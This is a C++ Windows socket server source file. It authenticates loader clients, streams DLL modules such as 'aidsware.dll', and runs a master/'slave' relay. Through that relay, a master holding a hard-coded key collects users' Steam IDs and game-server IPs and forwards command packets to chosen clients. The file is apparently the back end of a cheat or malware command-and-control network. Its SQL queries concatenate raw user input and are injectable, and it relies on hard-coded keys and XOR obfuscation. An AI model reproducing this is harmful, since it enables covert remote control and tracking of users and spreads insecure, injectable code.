#include "includes.h"

void alpha_listener_main()
{
    WSADATA wsaData;
    int iResult;
    SOCKET ListenSocket = INVALID_SOCKET;
    SOCKET ClientSocket = INVALID_SOCKET;

    struct addrinfo* result = NULL;
    struct addrinfo hints;

    int iSendResult = -1;
    char recvbuf[BUFFERSIZE];
    int recvbuflen = BUFFERSIZE;

    ZeroMemory(&hints, sizeof(hints));
    hints.ai_family = AF_INET;
    hints.ai_socktype = SOCK_STREAM;
    hints.ai_protocol = IPPROTO_TCP;
    hints.ai_flags = AI_PASSIVE;


    // Resolve the server address and port
    iResult = getaddrinfo(NULL, DEFAULT_ALPHA_PORT, &hints, &result);
    if (iResult != 0) {
        printf("getaddrinfo failed with error: %d\n", iResult);
        WSACleanup();
        return;
    }

    // Create a SOCKET for connecting to server
    ListenSocket = socket(result->ai_family, result->ai_socktype, result->ai_protocol);
    if (ListenSocket == INVALID_SOCKET) {
        printf("socket failed with error: %ld\n", WSAGetLastError());
        freeaddrinfo(result);
        WSACleanup();
        return;
    }

    // Setup the TCP listening socket
    iResult = bind(ListenSocket, result->ai_addr, (int)result->ai_addrlen);
    if (iResult == SOCKET_ERROR) {
        printf("bind failed with error: %d\n", WSAGetLastError());
        freeaddrinfo(result);
        closesocket(ListenSocket);
        WSACleanup();
        return;
    }

    freeaddrinfo(result);

    iResult = listen(ListenSocket, SOMAXCONN);
    if (iResult == SOCKET_ERROR) {
        printf("listen failed with error: %d\n", WSAGetLastError());
        closesocket(ListenSocket);
        WSACleanup();
        return;
    }
    printf("[Alpha] Listening...\n");

    //master key = \x12\x13\x21\x10\xA5\xFF\xC3\xB1\xf2\x2c\x2c\x3e\x3e\x02\x26\xae\x24\xde\x7c\x65\x74\xc1\x13\xc1

    while (1) {
        ClientSocket = accept(ListenSocket, NULL, NULL);

        if (ClientSocket == INVALID_SOCKET) {
            printf("accept failed with error: %d\n", WSAGetLastError());
            closesocket(ListenSocket);
            WSACleanup();
            return;
        }
        std::thread connection(manageAlphaConnection, ClientSocket, i_connections);
        connection.detach();
        ClientSocket = 0;
    }
    closesocket(ClientSocket);
}

int __cdecl main(void)
{
    printf("[Server] Starting...\n");
    sqlitelib::Sqlite db("los.db");
    p_db = &db;
    int db_test = p_db->execute_value<int>("select userid from users;");
    WSADATA wsaData;
    int iResult;
    SOCKET ListenSocket = INVALID_SOCKET;
    SOCKET ClientSocket = INVALID_SOCKET;

    struct addrinfo* result = NULL;
    struct addrinfo hints;

    int iSendResult = -1;
    char recvbuf[BUFFERSIZE];
    int recvbuflen = BUFFERSIZE;

    // Initialize Winsock
    iResult = WSAStartup(MAKEWORD(2, 2), &wsaData);
    if (iResult != 0) {
        printf("WSAStartup failed with error: %d\n", iResult);
        return 1;
    }

    std::thread alpha(alpha_listener_main);
    alpha.detach();

    ZeroMemory(&hints, sizeof(hints));
    hints.ai_family = AF_INET;
    hints.ai_socktype = SOCK_STREAM;
    hints.ai_protocol = IPPROTO_TCP;
    hints.ai_flags = AI_PASSIVE;

    // Resolve the server address and port
    iResult = getaddrinfo(NULL, DEFAULT_PORT, &hints, &result);
    if (iResult != 0) {
        printf("getaddrinfo failed with error: %d\n", iResult);
        WSACleanup();
        return 1;
    }

    // Create a SOCKET for connecting to server
    ListenSocket = socket(result->ai_family, result->ai_socktype, result->ai_protocol);
    if (ListenSocket == INVALID_SOCKET) {
        printf("socket failed with error: %ld\n", WSAGetLastError());
        freeaddrinfo(result);
        WSACleanup();
        return 1;
    }

    // Setup the TCP listening socket
    iResult = bind(ListenSocket, result->ai_addr, (int)result->ai_addrlen);
    if (iResult == SOCKET_ERROR) {
        printf("bind failed with error: %d\n", WSAGetLastError());
        freeaddrinfo(result);
        closesocket(ListenSocket);
        WSACleanup();
        return 1;
    }

    freeaddrinfo(result);

    iResult = listen(ListenSocket, SOMAXCONN);
    if (iResult == SOCKET_ERROR) {
        printf("listen failed with error: %d\n", WSAGetLastError());
        closesocket(ListenSocket);
        WSACleanup();
        return 1;
    }
    printf("[Auth] Listening...\n");

    while (1) {
        try
        {
            ClientSocket = accept(ListenSocket, NULL, NULL);
        }
        catch (...) { continue; }
        if (ClientSocket == INVALID_SOCKET) {
            printf("accept failed with error: %d\n", WSAGetLastError());
            closesocket(ListenSocket);
            WSACleanup();
            return 1;
        }
        std::thread connection(manageConnection, ClientSocket, i_connections);
        connection.detach();
        ClientSocket = 0;
    }
    closesocket(ClientSocket);
    WSACleanup();
}

std::string key{ '\x12', '\x01', '\xFF', '\x12', '\x01', '\x21' };

std::string encryptDecrypt(std::string toEncrypt, std::string authkey) {
    std::string tkey = authkey;
    std::string output = toEncrypt;

    for (int i = 0; i < toEncrypt.size(); i++)
        output[i] = (toEncrypt[i] ^ tkey[i % tkey.size()]);

    return output;
}
std::vector<std::string> current_tokens = {};

struct slave
{
    std::string name;
    std::string steamname;
    std::string steamid;
    std::string server;
    SOCKET sock;
};

SOCKET alpha_master = INVALID_SOCKET;
std::vector<slave> slaves{};

const char master_key[25] = "\x12\x13\x21\x10\xA5\xFF\xC3\xB1\xf2\x2c\x2c\x3e\x3e\x02\x26\xae\x24\xde\x7c\x65\x74\xc1\x13\xc1";

void manageAlphaConnection(SOCKET s, const int clientnumber)
{
    int packets = 1;
    //check if packet sent = key \x12\x13\x21\x10\xA5\xFF\xC3\xB1\xf2\x2c\x2c\x3e\x3e\x02\x26\xae\x24\xde\x7c\x65\x74\xc1\x13\xc1
    //set master

    char buffer[BUFFERSIZE];

    slave self;
    self.sock = s;

    int iResult = 0;

    bool is_master = false;

    while (1)
    {
        /*
        * first packet:
        * check if master
        * if not master add to "slaves"
        *
        * next packets:
        * if master socket sent packet relay packet to all slaves
        * if any errors occur on recv or send close respective socket and remove from master or list
        *
        *
        * slave first packet will forumusername + \x99 + steamusername + \x99 + steamid + \x99
        * every time slave joins new server the ip will be sent to the server and then to the master
        * 
        */
        try
        {
            iResult = recv(s, buffer, BUFFERSIZE, 0);

            if (iResult != 1024)
            {
                if (is_master) {
                    alpha_master = 0;
                    closesocket(alpha_master);
                    printf("[Alpha] Master disconnected.\n");
                    return;
                }
                else
                {
                    printf("[Alpha] -Slave (%s disconnected)\n", self.name.c_str());
                    //slaves.erase(std::find(slaves.begin(), slaves.end(), self));
                    auto temp = slaves;
                    slaves.clear();
                    for (auto c : temp)
                        if (c.name != self.name)
                            slaves.push_back(c);
                    closesocket(self.sock);
                    return;
                }
            }

            if (packets == 1)
            {
                for (size_t i = 0; i < 25; i++)
                {
                    if (buffer[i] != master_key[i])
                        break;
                    is_master = true;
                    alpha_master = s;
                }
                if (!is_master)
                {
                    std::string name = "";
                    std::string steam = "";
                    std::string id = "";

                    int in = 0;

                    for (size_t i = 0; i < BUFFERSIZE; i++)
                    {
                        if (in == 0)
                        {
                            if (buffer[i] == '\x99') { in = 1; continue; }
                            name += buffer[i];
                        }
                        if (in == 1)
                        {
                            if (buffer[i] == '\x99') { in = 2; continue; }
                            steam += buffer[i];
                        }
                        if (in == 2)
                        {
                            if (buffer[i] == '\x99') break;
                            id += buffer[i];
                        }
                    }
                    self.name = name;
                    self.steamname = steam;
                    self.steamid = id;
                    slaves.push_back(self);
                    printf("[Alpha] +Slave (%s [%i]) connected\n", name.c_str(), slaves.size());
                }


                if (is_master) //if master and first connect, send all slaves 1 by 1
                {
                    printf("[Alpha] Master connected.\n");
                    memset(buffer, '\x00', 1024 * sizeof(*buffer));

                    std::string am = std::to_string(slaves.size());
                    for (size_t y = 0; y < am.size(); y++)
                        buffer[y] = am[y];
                    send(alpha_master, buffer, 1024, 0); //send amount of slaves to master

                    memset(buffer, '\x00', 1024 * sizeof(*buffer));
                    for (auto c : slaves)
                    {
                        memset(buffer, '\x00', 1024 * sizeof(*buffer));
                        std::string msg = c.name + '\x99' + c.steamname + '\x99' + c.steamid + '\x99' + c.server + '\x99';
                        for (size_t z = 0; z < msg.size(); z++)
                            buffer[z] = msg[z];
                        send(alpha_master, buffer, 1024, 0);
                    }
                }
            }

            if (packets > 1 && is_master)
            {
                //packet could be CMD packet, 
                if (buffer[0] == '\xC2') //C2 = cmd packet - just relay rest of packet to users
                {
                    std::string bid = "";
                    int pos = 0;
                    for (size_t i = 1; i < 1024; i++)
                    {
                        if (buffer[i] == '\x99') { pos = i + 1; break; }
                        bid += buffer[i];
                    }

                    char msg[1024];
                    memset(msg, '\x00', 1024 * sizeof(*msg));
                    int t = 0;
                    for (size_t i = 0; i < 1024; i++)
                        msg[i] = buffer[pos + i];
                    
                    memset(buffer, '\x00', 1024 * sizeof(*buffer));

                    for (auto c : slaves)
                        if(c.steamid == bid)
                            send(c.sock, msg, BUFFERSIZE, 0);
                }

                if (buffer[0] == '\xC0') //C0 = get all slave info packet
                {
                    memset(buffer, '\x00', 1024 * sizeof(*buffer));

                    std::string am = std::to_string(slaves.size());
                    for (size_t y = 0; y < am.size(); y++)
                        buffer[y] = am[y];
                    
                    send(alpha_master, buffer, 1024, 0); //send amount of slaves to master

                    memset(buffer, '\x00', 1024 * sizeof(*buffer));
                    for (auto c : slaves) //send each slave info
                    {
                        memset(buffer, '\x00', 1024 * sizeof(*buffer));
                        std::string msg = c.name + '\x99' + c.steamname + '\x99' + c.steamid + '\x99' + c.server + '\x99';
                        for (size_t z = 0; z < msg.size(); z++)
                            buffer[z] = msg[z];
                        send(alpha_master, buffer, 1024, 0);
                    }
                }
            }

            if (packets > 1 && !is_master)
            {
                //packet could be OK packet, SERVER packet, can add functionality
                if (buffer[0] == '\xA1') //A1 = server packet
                {
                    std::string ip = "none";
                    for (size_t z = 1; z < 1024; z++)
                    {
                        if (buffer[z] == '\x99') break;
                        ip[z] = buffer[z];
                    }
                    //slaves.erase(std::find(slaves.begin(), slaves.end(), self));
                    auto temp = slaves;
                    slaves.clear();
                    for (auto c : temp)
                        if (c.name != self.name)
                            slaves.push_back(c);

                    self.server = ip;
                    slaves.push_back(self);
                    printf("[Alpha] %s joined %s\n", self.name.c_str(), self.server.c_str());
                }

                if (buffer[0] == '\xA2') //A2 = update info packet
                {
                    int in = 0;
                    std::string name = "";
                    std::string steam = "";
                    std::string id = "";
                    std::string server = "";
                    for (size_t i = 1; i < BUFFERSIZE; i++)
                    {
                        if (in == 0)
                        {
                            if (buffer[i] == '\x99') { in = 1; continue; }
                            name += buffer[i];
                        }
                        if (in == 1)
                        {
                            if (buffer[i] == '\x99') { in = 2; continue; }
                            steam += buffer[i];
                        }
                        if (in == 2)
                        {
                            if (buffer[i] == '\x99') { in = 3; continue; }
                            id += buffer[i];
                        }
                        if (in == 3)
                        {
                            if (buffer[i] == '\x99') break;
                            server += buffer[i];
                        }
                    }
                    //slaves.erase(std::find(slaves.begin(), slaves.end(), self));
                    auto temp = slaves;
                    slaves.clear();
                    for (auto c : temp)
                        if (c.name != self.name)
                            slaves.push_back(c);

                    self.name = name;
                    self.steamname = steam;
                    self.steamid = id;
                    self.server = server;
                    slaves.push_back(self);
                    printf("[Alpha] %s updated (%s, %s, %s)\n", self.name.c_str(), self.steamname.c_str(), self.steamid.c_str(), self.server.c_str());
                }
            }

            memset(buffer, '\x00', 1024 * sizeof(*buffer));
            packets++;
        }
        catch (...)
        {
            if (is_master) {
                alpha_master = 0;
                closesocket(alpha_master);
                printf("[Alpha] Master disconnected.\n");
                return;
            }
            else
            {
                printf("[Alpha] -Slave (%s disconnected)\n", self.name.c_str());
                //slaves.erase(std::find(slaves.begin(), slaves.end(), self));
                auto temp = slaves;
                slaves.clear();
                for (auto c : temp)
                    if (c.name != self.name)
                        slaves.push_back(c);
                closesocket(self.sock);
                return;
            }
        }
    }
}

void manageConnection(SOCKET s, const int clientnumber)
{
    int login_attempts = 0;
    std::string Tusername = "";
    char recvbuf[BUFFERSIZE];
    //long authkey = 0;
    int ClientSocket = s, recievedpackets = 0, iResult, iSendResult, cnum = clientnumber;

    struct sockaddr_in peeraddr;
    socklen_t peeraddrlen = sizeof(sockaddr_in);
    getpeername(ClientSocket, (struct sockaddr*)&peeraddr, &peeraddrlen);
    std::string ip(inet_ntoa(peeraddr.sin_addr));
    char ip_hash[65];
    sha256_string(const_cast<char*>(ip.c_str()), ip_hash);

    try {
        i_connections += 1;
        std::cout << "[" << i_connections << "]" << " Client connected... { " << cnum << " }\n";
        std::string authkey = "slapemsmokey";

        // Receive until the peer shuts down the connection
        do {
            iResult = recv(ClientSocket, recvbuf, BUFFERSIZE, 0);

            if (iResult != BUFFERSIZE)
            {
                printf("[%o] Client {{%o}} disconnected (1)\n", i_connections, cnum);
                i_connections -= 1;
                //WSACleanup();
                return;
            }

            std::string out(recvbuf); //= encryptDecrypt(recvbuf, authkey);
            recievedpackets += 1;

            int fasd = 0;

            for (auto it = current_tokens.begin(); it != current_tokens.end(); it++)
            {
                //first packet from dll will be token only, at 65 chars
                std::string token = current_tokens[fasd++];
                if (out == token)
                {
                    //send heartbeat
                    char* buf1{};
                    while (1)
                    {
                        //wait for ping from client
                        int r = recv(ClientSocket, buf1, 65, 0);
                        std::string f(recvbuf);
                        if (f != out)
                        {
                            //not recognised token
                            printf("[%o] Client {{%o}} disconnected (unrecognised token from dll)\n", i_connections, cnum);
                            i_connections -= 1;
                            closesocket(ClientSocket);
                            //WSACleanup();
                            return;
                        }
                        if (r != 65)
                        {
                            //error with receive? just remove from connected and close connection
                            printf("[%o] Client {{%o}} disconnected (dll)\n", i_connections, cnum);
                            i_connections -= 1;
                            current_tokens.erase(it--);
                            closesocket(ClientSocket);
                            //WSACleanup();
                            return;
                        }
                        memset(recvbuf, 0, BUFFERSIZE * sizeof(*recvbuf));
                        SleepEx(60000, 0); //Sleep for 10 minutes
                    }
                }
            }


            if (std::string(out).find("H-C") != std::string::npos
                && recievedpackets == 1)
            {
                /*
                i_connections -= 1;
                printf("[%o] Client {{%o}} disconnected: recieved %s\n", i_connections, cnum, std::string(out).c_str());
                closesocket(ClientSocket);
                */
                if (SendFile(ClientSocket, "/root/aidsware.dll") < 0)
                {
                    printf("\nThere was an error sending the dll!\n");
                    closesocket(ClientSocket);
                    return;
                }

                printf("[%o] { %o } Dll streamed!\n", i_connections, cnum);

                i_connections -= 1;
                printf("[%o] Client {{%o}} disconnected (sent dll)!\n", i_connections, cnum);
                closesocket(ClientSocket);
                return;
            }
            if (std::string(out).find("H-C") == std::string::npos
                && recievedpackets == 1)
            {
                i_connections -= 1;
                printf("[%o] Client {{%o}} disconnected (error from hello): recieved %s\n", i_connections, cnum, std::string(out).c_str());
                closesocket(ClientSocket);
                return;
            }

            if (std::string(out).find("R-M-") != std::string::npos
                && recievedpackets == 3)
            {
                std::string byteString = "";
                auto mods = p_db->execute<std::string>(std::string("select modules from users where username='" + Tusername + "';").c_str());
                std::string rmodstr = out.substr(4, std::string(out).find("|"));
                while (rmodstr.find("|") != std::string::npos)
                {
                    rmodstr = rmodstr.erase(rmodstr.find("|"));
                }
                printf("[%o] (%s) Sending module %s...\n", cnum, ip.c_str(), rmodstr.c_str());
                std::cout << "[" << i_connections << "]" << " { " << cnum << " } Requested module " << rmodstr.c_str() << "\n";
                bool flag = false;
                for (auto a : explode(mods[0], '|')) {
                    if (rmodstr.find(a) != std::string::npos) {
                        printf("[%o] (%s) Sending module %s...\n", cnum, ip.c_str(), a.c_str());
                        printf("Sending module %s\n", a.c_str());
                        rmodstr = "/root/" + a + ".dll";
                        flag = true;
                    }
                }
                if (!flag)
                {
                    printf("[%o] { %o } An error occured when sending. (incorrect module access)\n", i_connections, cnum);
                    // WSACleanup();
                    i_connections -= 1;
                    closesocket(ClientSocket);
                    return;
                }
                char file_buffer[BUFFERSIZE];

                if (SendFile(ClientSocket, rmodstr) < 0)
                {
                    printf("\nThere was an error sending the dll!\n");
                    closesocket(ClientSocket);
                    return;
                }

                printf("[%o] { %o } Dll streamed!\n", i_connections, cnum);
            }

            if (std::string(out).find("L|") != std::string::npos
                && recievedpackets == 2)
            {
                printf("[%o] (%s) Received login (%o)...\n", cnum, ip.c_str(), ++login_attempts);
                char buffer[BUFFERSIZE]; //buffer for msg

                std::vector<std::string> ov = explode(out, '|');

                std::string username = ov[1];
                std::string hwidf = ov[2];
                std::string ver = ov[3];

                if (ver != "1.7")
                {
                    i_connections -= 1;
                    printf("[%o] Client { %o } disconnected: client had wrong version, received: %s\n", i_connections, cnum, std::string(out).c_str());
                    buffer[0] = '\xA2';
                    send(ClientSocket, buffer, BUFFERSIZE, 0);
                    closesocket(ClientSocket);
                    return; //old loader
                }

                std::string n_hw(hwidf);// n_hw += ip_hash;
                char hwid[65];
                sha256_string(const_cast<char*>(n_hw.c_str()), hwid);

                auto pp = p_db->execute<std::string>(std::string("select pwdhash from users where username='" + std::string(username) + "'").c_str());

                if (pp.size() < 1)
                {
                    i_connections -= 1;
                    printf("[%o] Client { %o } disconnected: recieved %s\n", i_connections, cnum, std::string(out).c_str());
                    closesocket(ClientSocket);
                    return; //password does not exist
                }

                if (login_attempts > 3)
                {
                    i_connections -= 1;
                    printf("[%o] Client { %o } disconnected: login attemps exceeded 3! (%s)\n", i_connections, cnum, username);
                    closesocket(ClientSocket);
                    return;
                }
                //is hwid same

                auto pwdhash = pp[0];

                srand(time(NULL));
                long unum = getBigLong();
                std::string uniquehash = hmac256(std::to_string(unum), pwdhash); //encrypt unique number and key = hash of pwd

                std::string e_str = "c." + std::to_string(unum);
                std::string sendstr = encryptDecrypt(e_str, authkey);

                iSendResult = send(ClientSocket, sendstr.c_str(), BUFFERSIZE, 0);

                printf("[%o] (%s) Sent unique challenge (%ld) to client { %o }\n", i_connections, ip.c_str(), unum, cnum);

                memset(buffer, '\x00', BUFFERSIZE);

                //recieve answer
                iResult = recv(ClientSocket, buffer, BUFFERSIZE, 0);
                out = encryptDecrypt(std::string(buffer), authkey);
                std::string challenge_reply{};

                //is it an answer to the challenge?
                if (out[0] == 'r')
                    challenge_reply = out.substr(2, out.size());
                else
                { //if not kill connection
                    i_connections -= 1;
                    printf("[%o] Client { %o } disconnected, recieved: %s\n", i_connections, cnum, std::string(out).c_str());
                    closesocket(ClientSocket);
                    //WSACleanup();
                    return;
                }

                char buf1[65];
                char buf2[65];
                sha256_string(const_cast<char*>(challenge_reply.c_str()), buf1);
                sha256_string(const_cast<char*>(uniquehash.c_str()), buf2);

                if (strcmp(buf1, buf2) == 0)
                {
                    std::string sendbuffer = encryptDecrypt("\x99", authkey);
                    iSendResult = send(ClientSocket, sendbuffer.c_str(), BUFFERSIZE, 0);
                    printf("[%o] (%s) Unique challenge (%ld) passed { %o }\n", i_connections, ip.c_str(), unum, cnum, std::string(out).c_str());
                    authkey = unum;

                    auto mods = p_db->execute<std::string>(std::string("select modules from users where username='" + std::string(username) + "'").c_str());
                    auto hwids = p_db->execute<std::string>(std::string("select hwid from users where username='" + std::string(username) + "'").c_str());

                    if (hwids.size() == 0)
                    {
                        p_db->execute(std::string("UPDATE users SET hwid='" + std::string(hwid) + "' WHERE username='" + std::string(username) + "'").c_str());
                    }
                    else if (hwids.size() > 0)
                    {
                        std::string ofp = hwids[0];
                        if (ofp == "ns")
                        {
                            p_db->execute(std::string("UPDATE users SET hwid='" + std::string(hwid) + "' WHERE username='" + std::string(username) + "'").c_str());
                            goto _asdasd;
                        }
                        if (ofp != hwid)
                        {
                            p_db->execute(std::string("UPDATE users SET status=2 WHERE username='" + std::string(username) + "'").c_str());
                            printf("[%o] (%s) Client connected with wrong HWID (%s), their account has been locked. (%s)\n", i_connections, ip.c_str(), hwid, username.c_str());
                            std::string pack_et = "incorrect_hwid";
                            send(ClientSocket, encryptDecrypt(pack_et, authkey).c_str(), BUFFERSIZE, 0);
                            closesocket(ClientSocket);
                            i_connections -= 1;
                            return;
                        }
                    }
                _asdasd:
                    auto status = p_db->execute<int>(std::string("select status from users where username='" + std::string(username) + "'").c_str());

                    if (status[0] > 1)
                    {
                        printf("[%o] (%s) Client connected with status more than 1! (%s)\n", i_connections, ip.c_str(), cnum, std::string(out).c_str(), username.c_str());
                        std::string pack_et = "incorrect_account_status";
                        send(ClientSocket, encryptDecrypt(pack_et, authkey).c_str(), BUFFERSIZE, 0);
                        closesocket(ClientSocket);
                        i_connections -= 1;
                        return;
                    }

                    current_tokens.push_back(uniquehash);
                    std::string modpacket = "";
                    for (auto a : mods)
                        modpacket += a + "|";
                    modpacket = encryptDecrypt(modpacket, authkey);
                    send(ClientSocket, modpacket.c_str(), BUFFERSIZE, 0);
                    Tusername = username;
                    continue;
                }
                i_connections -= 1;
                printf("[%i] Client { %i } %s failed login: recieved %s\n", i_connections, cnum, username.c_str(), std::string(out).c_str());
                closesocket(ClientSocket);
                i_connections -= 1;
                return; //hash was not the same
            }

            if (std::string(out).find("R|") != std::string::npos
                && recievedpackets == 2)
            {
                recievedpackets -= 1;
                //"R|" + username + "|" + pwdhash + "|" + ak + "|" + outputbuffer + "|1.0"
                std::vector<std::string> ov = explode(out, '|');
                std::string username = ov[1];
                std::string pwd = ov[2];
                std::string api = ov[3];
                std::string hwidf = ov[4];
                std::string ver = ov[5];

                if (ver != "1.7")
                {
                    i_connections -= 1;
                    printf("[%o] Client { %o } disconnected: client had wrong version, received: %s\n", i_connections, cnum, std::string(out).c_str());
                    char buffer[1024] = { '\xA2' };
                    send(ClientSocket, buffer, BUFFERSIZE, 0);
                    closesocket(ClientSocket);
                    return; //old loader
                }

                std::string n_hw(hwidf);// n_hw += ip_hash;
                char hwid[65];
                sha256_string(const_cast<char*>(n_hw.c_str()), hwid);

                printf("[%o] (%s) Received register (%s)...\n", cnum, ip.c_str(), username.c_str());
                auto un_exists = p_db->execute_value<std::string>(std::string("select userid from users where username='" + username + "'").c_str());
                if (un_exists.size() > 0)
                {
                    char sendbuf[BUFFERSIZE];
                    memset(sendbuf, 0, BUFFERSIZE * sizeof(*sendbuf));
                    sendbuf[0] = '\x01';
                    send(ClientSocket, encryptDecrypt(sendbuf, authkey).c_str(), BUFFERSIZE, 0);
                    continue;
                }
                auto hwids = p_db->execute<int>(std::string("select _id from blacklist where hwid='" + std::string(hwid) + "'").c_str());
                if (hwids.size() > 0)
                {
                    char sendbuf[BUFFERSIZE];
                    memset(sendbuf, 0, BUFFERSIZE * sizeof(*sendbuf));
                    sendbuf[0] = '\x02';
                    send(ClientSocket, encryptDecrypt(sendbuf, authkey).c_str(), BUFFERSIZE, 0);
                    continue;
                }
                auto hwids2 = p_db->execute<int>(std::string("select hwid from users where hwid='" + std::string(hwid) + "'").c_str());
                if (hwids2.size() > 0)
                {
                    char sendbuf[BUFFERSIZE];
                    memset(sendbuf, 0, BUFFERSIZE * sizeof(*sendbuf));
                    sendbuf[0] = '\x04';
                    send(ClientSocket, encryptDecrypt(sendbuf, authkey).c_str(), BUFFERSIZE, 0);
                    continue;
                }
                auto matching_keys = p_db->execute_value<std::string>(std::string("select api_mods from apikeys where api_value='" + api + "'").c_str());
                if (matching_keys.size() == 0)
                {
                    char sendbuf[BUFFERSIZE];
                    memset(sendbuf, 0, BUFFERSIZE * sizeof(*sendbuf));
                    sendbuf[0] = '\x03';
                    send(ClientSocket, encryptDecrypt(sendbuf, authkey).c_str(), BUFFERSIZE, 0);
                    continue;
                }

                auto stmt = p_db->prepare("insert into users (username, pwdhash, hwid, apikey, modules) values (?, ?, ?, ?, ?)");
                stmt.execute(username, pwd, hwid, api, matching_keys.data());
                p_db->execute(std::string("update apikeys set used=1 where api_value='" + api + "'").c_str());
                continue;
            }

        } while (ClientSocket != -1);
    }
    catch (...)
    {
        printf("[%i] An error occured, killing connection.", cnum);
        closesocket(ClientSocket);
        i_connections -= 1;
        return;
    }
}

static std::vector<unsigned char> hmac_sha256(const std::vector<unsigned char>& data, const std::vector<unsigned char>& key)
{
    unsigned int len = EVP_MAX_MD_SIZE;
    std::vector<unsigned char> digest(len);


    HMAC_CTX* ctx = HMAC_CTX_new();
    //HMAC_Init_ex(h, key, keylen, EVP_sha256(), NULL);

    HMAC_Init_ex(ctx, key.data(), key.size(), EVP_sha256(), NULL);
    HMAC_Update(ctx, data.data(), data.size());
    HMAC_Final(ctx, digest.data(), &len);

    //HMAC_CTX_cleanup(ctx);
    HMAC_CTX_free(ctx);

    return digest;
}

std::string hmac256(std::string data, std::string key)
{
    std::vector<unsigned char> secret(data.begin(), data.end());
    std::vector<unsigned char> msg(key.begin(), key.end());

    std::vector<unsigned char> out = hmac_sha256(msg, secret);

    std::string strout{};

    for (size_t i = 0; i < out.size() - 1; i++)
        strout += out[i];

    return strout;
}

long getBigLong()
{
    srand(time(NULL));
    long _n = 1;
    std::random_device rd;
    std::default_random_engine generator(rd());
    std::uniform_int_distribution<long long unsigned> distribution(0, 0xFFFFFFFFFFFFFFFF);
    for (int i = 0; i < 10; i++) {
        _n += (long long)sqrt(distribution(generator));
    }
    return _n;
}